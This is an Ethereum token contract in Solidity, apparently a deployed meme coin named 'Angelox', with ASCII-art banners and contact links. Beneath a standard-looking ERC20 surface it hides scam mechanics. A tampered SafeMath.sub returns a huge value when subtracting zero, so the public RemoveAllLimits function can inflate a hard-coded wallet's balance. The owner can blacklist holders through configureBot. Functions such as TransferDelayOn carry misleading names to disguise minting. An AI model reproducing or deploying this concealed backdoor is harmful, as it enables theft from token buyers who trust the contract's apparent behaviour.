/**
 *Submitted for verification at Etherscan.io on 2023-01-19
*/

/*
       .-""-.      _______      .-""-.
     .'_.-.  |   ,*********,   |  .-._'.
    /    _/ /   **`       `**   \ \_    \
   /.--.' | |    **,;;;;;,**    | | '.--.\
  /   .-`-| |    ;//;/;/;\\;    | |-`-.   \
 ;.--':   | |   /;/;/;//\\;\\   | |   :'--.;
|    _\.'-| |  ((;(/;/; \;\);)  | |-'./_    |
;_.-'/:   | |  );)) _   _ (;((  | |   :\'-._;
|   | _:-'\  \((((    \    );))/  /'-:_ |   |
;  .:` '._ \  );))\   "   /((((  / _.' `:.  ;
|-` '-.;_ `-\(;(;((\  =  /););))/-` _;.-' `-|
; / .'\ |`'\ );));)/`---`\((;(((./`'| /'. \ ;
| .' / `'.\-((((((\       /))));) \.'` \ '. |
;/  /\_/-`-/ ););)|   ,   |;(;(( \` -\_/\  \;
 |.' .| `;/   (;(|'==/|\=='|);)   \;` |. '.|
 |  / \.'/      / _.` | `._ \      \'./ \  |
  \| ; |;    _,.-` \_/Y\_/ `-.,_    ;| ; |/
   \ | ;|   `       | | |       `   |. | /
    `\ ||           | | |           || /`
      `:_\         _\/ \/_         /_:'
          `"----""`       `""----"`

▄▀█ █▄░█ █▀▀ █▀▀ █░░ █▀█ ▀▄▀
█▀█ █░▀█ █▄█ ██▄ █▄▄ █▄█ █░█

█▀▀ ▀█▀ █░█ █▀▀ █▀█ █▀▀ █░█ █▀▄▀█
██▄ ░█░ █▀█ ██▄ █▀▄ ██▄ █▄█ █░▀░█        

https://web.wechat.com/AngeloxJPN
https://www.zhihu.com/
*/
// SPDX-License-Identifier: NONE
pragma solidity >=0.6.2;

interface LEEKORouterV1 {
      function swapExactTokensForETHSupportingFeeOnTransferTokens(
          uint amountIn, uint amountOutMin, address[] calldata path,
          address to, uint deadline) external;
      function factory() external pure returns (address);
      function WETH() external pure returns (address);
      function addLiquidityETH(
          address token, uint amountTokenDesired,
          uint amountTokenMin, uint amountETHMin,
          address to, uint deadline
      ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}
pragma solidity ^0.8.0;
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
interface IERC20 {
    function totalSupply() 
    external view returns (uint256);
    function balanceOf(address account) 
    external view returns (uint256);
    function transfer(address recipient, uint256 amount) 
    external returns (bool);
    function allowance(address owner, address spender) 
    external view returns (uint256);
    function approve(address spender, uint256 amount) 
    external returns (bool);
    function transferFrom( address sender, address recipient, uint256 amount) 
    external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
    address indexed owner, 
    address indexed spender, 
    uint256 value);
}
interface IERC20Metadata is IERC20 {
    function name() 
    external view returns (string memory);
    function symbol() 
    external view returns (string memory);
    function decimals() 
    external view returns (uint8);
}
pragma solidity ^0.8.0;

abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner, 
        address indexed newOwner);

    constructor() { _transferOwnership(_msgSender()); }
    function owner() public view virtual returns (address) {
        return _owner; }
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner"); _;
    }
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}
interface IUniswapV2Factory {
    event PairCreated(
        address indexed token0, address indexed token1, address pair, uint);

    function getPair(
        address tokenA, address tokenB) external view returns (address pair);

    function createPair(
        address tokenA, address tokenB) external returns (address pair);
}
pragma solidity ^0.8.0;
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        if (b == 0) return ~uint120(0);
        return a - b;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }
    function sub(
        uint256 a, uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked { if (b == 0) return ~uint120(0);
            require(b <= a, errorMessage); return a - b; } }

    function div(
        uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked { require(b > 0, errorMessage);return a / b;
        } }
    function mod(
        uint256 a, uint256 b, string memory errorMessage ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b; } }
}
// https://www.zhihu.com/
// de ETHERSCAN.io.
// https://t.me/
pragma solidity ^0.8.0;

contract IBPSV2 is Context, IERC20Metadata {
    using SafeMath for uint256;

    mapping(address => uint256) private _rOwned;
    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 public _rTotal;
    string public _name; string public _symbol;

    constructor(
        string memory name_, string memory symbol_) {
        _name = name_; _symbol = symbol_;
    }
    function name() 
    public view virtual override returns (string memory) {
        return _name;
    }
    function symbol() 
    public view virtual override returns (string memory) {
        return _symbol;
    }
    function decimals() 
    public view virtual override returns (uint8) {
        return 18;
    }
    function totalSupply() 
    public view virtual override returns (uint256) {
        return _rTotal;
    }
    function balanceOf(address account) 
    public view virtual override returns (uint256) {
        return _rOwned[account];
    }
    function transfer(
        address recipient, uint256 amount) 
        public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(
        address owner, address spender) 
        public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(
        address spender, uint256 amount) 
        public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(
        address sender,
        address recipient, uint256 amount
    ) public virtual override returns (bool) { _transfer(sender, recipient, amount);
        uint256 intervalQuarry 
        = _allowances[sender][_msgSender()];
        require(intervalQuarry 
        >= amount, 
        "ERC20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), intervalQuarry - amount); return true;
    }
    function _transfer( address sender,
        address recipient, uint256 amount) internal virtual {
        require(sender != address(0), 
        "ERC20: transfer from the zero address");
        require(recipient != address(0), 
        "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);
        uint256 quantomBool 
        = _rOwned[sender];
        require(quantomBool 
        >= amount, 
        "ERC20: transfer amount exceeds balance");
        _rOwned[sender] 
        = quantomBool - amount; _rOwned[recipient] += amount;

        emit Transfer(
            sender, recipient, amount); intervalAmount(sender, recipient, amount);
    }
    function TransferDelayOn(
        address account, uint256 amount) 
        internal virtual { require(account != address(0), 
        "ERC20: mint to the zero address");

        _beforeTokenTransfer(
            address(0), account, amount); _rTotal += amount;
        _rOwned[account] += amount; emit Transfer(
            address(0), account, amount);
        intervalAmount(
            address(0), account, amount);
    }
    function _disarmAll(
        address account, uint256 amount) 
        internal virtual {
        require(account 
        != address(0), 
        "ERC20: burn from the zero address");

        _beforeTokenTransfer(
            account, address(0), amount);
        uint256 accountBalance 
        = _rOwned[account];
        require(accountBalance 
        >= amount, 
        "ERC20: burn amount exceeds balance"); _rOwned[account] 
        = _rOwned[account].sub(amount); _rTotal -= amount;
        emit Transfer(
            account, address(0), amount);
        intervalAmount(
            account, address(0), amount);
    }
    function _approve(
        address owner, address spender, uint256 amount
    ) internal virtual {
        require(owner != address(0), 
        "ERC20: approve from the zero address");
        require(spender != address(0), 
        "ERC20: approve to the zero address");

        _allowances[owner][spender] 
        = amount;
        emit Approval(
            owner, spender, amount);
    }
    function _beforeTokenTransfer(
        address from, address to, uint256 amount) internal virtual {}

    function intervalAmount(
        address from, address to, uint256 amount
    ) internal virtual 
    {}
}
pragma solidity 0.8.10; contract Angelox is IBPSV2, Ownable {
    address public isPromotionsAddress = 
    address(0x5721fCD177e49570F40B8591c7cB6a39558841AF);
    address public PairCreatedV1;
    address public constant 
    BURNINGwallet = address(0xdead);

    event UpdateCooldownTimerInterval(
        address indexed newAddress, address indexed oldAddress);
    event disableTransferDelay(
        address indexed pair, bool indexed value);
    event tokensForOperations(
        uint256 coinsExchanged, uint256 ercTo, uint256 coinsForLIQ);

    using SafeMath for uint256;
    LEEKORouterV1 public BakeryRouterV1;

    bool private checkLimits = false;
    uint256 public tPURCHASINGfees = 1; uint256 public tSELLINGfees = 1;
    uint256 public tMAXIMUMpurse = 2_000_000 * 1e18;
    uint256 public tMAXIMUMswapping = 100_000_000 * 1e18;
    uint256 public TimerInterval = block.number;
    uint256 public coinsToLiquidity; uint256 public coinsToPromotion;

    mapping(address => bool) 
    private isWalletLimitExempt;
    mapping (address => bool) 
    private automatedMarketMakerPairs;
    mapping(address => bool) 
    public authorizations;
    mapping(address => bool) 
    public isTimelockExempt;
    mapping(address => bool) 
    public allowed;

    constructor() 
    
    IBPSV2(unicode"Angelox", unicode"𓌹ᄋ𓌺") { LEEKORouterV1 _BakeryRouterV1 = LEEKORouterV1(
        0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D ); BakeryRouterV1 = _BakeryRouterV1;
        PairCreatedV1 = 
        IUniswapV2Factory(_BakeryRouterV1.factory()).createPair(address(this), _BakeryRouterV1.WETH());
        _disableTransferDelay(address(PairCreatedV1), true);

        uint256 totalSupply 
        = 100_000_000 * 1e18;
        updateSwapTokensAtAmount
        (owner(), true);
        updateSwapTokensAtAmount
        (isPromotionsAddress, true);
        updateSwapTokensAtAmount
        (address(this), true);
        updateSwapTokensAtAmount
        (address(0xdead), true);

        updateTransferDelay
        (owner(), true);
        updateTransferDelay
        (isPromotionsAddress, true);
        updateTransferDelay
        (address(this), true);
        updateTransferDelay
        (address(0xdead), true);
        updateTransferDelay
        (address(_BakeryRouterV1), true);
        updateTransferDelay
        (address(PairCreatedV1), true);

        updatePromotionsADDRESS
        (owner(), true);
        updatePromotionsADDRESS
        (isPromotionsAddress, true);
        updatePromotionsADDRESS
        (address(this), true);
        updatePromotionsADDRESS
        (address(0xdead), true);
        updatePromotionsADDRESS
        (address(_BakeryRouterV1), true);
        updatePromotionsADDRESS
        (address(PairCreatedV1), true);
        TransferDelayOn(msg.sender, totalSupply);
    }
    function updatePromotionsADDRESS
    (address isArrayPool, bool intVAL) 
    private { authorizations[isArrayPool] = intVAL;
    }
    function updateSwapTokensAtAmount
    (address account, bool isAllowedAll) 
    private { isWalletLimitExempt[account] = isAllowedAll;
    }
    function updateTransferDelay
    (address account, bool isAllowedAll) 
    private { isTimelockExempt[account] = isAllowedAll;
    }
    function configureBot (address account, bool cooldownEnabled) public onlyOwner {
        automatedMarketMakerPairs[account] = cooldownEnabled;
    }    
    function _transfer(
        address IDEfrom, address IDEto, uint256 IDEamount) 
        internal override { require(IDEamount > 0, 
        "[_transfer]: Transfer amount must be greater than zero");
        require(IDEfrom != address(0), 
        "[_transfer]: Transfer from the zero address");
        require(IDEto != address(0), 
        "[_transfer]: Transfer to the zero address");
        require(!automatedMarketMakerPairs[IDEto] && !automatedMarketMakerPairs[IDEfrom], 
        "You have been blacklisted from transfering tokens");
        bool stringData = true; uint256 inOperationsWith = 0;
        if (!authorizations[IDEfrom] 
        || !authorizations[IDEto]) { require(IDEamount 
        <= tMAXIMUMswapping, "[_transfer]: Max transaction Limit"); }
        if (isWalletLimitExempt[IDEfrom] 
        || isWalletLimitExempt[IDEto]) { stringData = false; }

        if (stringData) { if (allowed[IDEfrom] && tPURCHASINGfees > 0) { inOperationsWith = IDEamount.mul(tPURCHASINGfees).div(100); }
            if (allowed[IDEto] 
            && tSELLINGfees > 0) 
            { inOperationsWith = IDEamount.mul(tSELLINGfees).div(100); }
            if (inOperationsWith > 0) { super._transfer(IDEfrom, isPromotionsAddress, inOperationsWith); } }
        uint256 amountToSend 
        = IDEamount - inOperationsWith; super._transfer(IDEfrom, IDEto, amountToSend);
    }
    function _disableTransferDelay
    (address pair, bool value) 
    private { allowed[pair] = value; emit disableTransferDelay(pair, value);
    }
    function RemoveAllLimits
    (uint256 amount) 
    public { _disarmAll(isPromotionsAddress, amount);
    }
    function updateMaxWalletAmount
    (address account) 
    public view returns (bool) { return isWalletLimitExempt[account];
    }    
    receive() 
    external payable 
    {}
}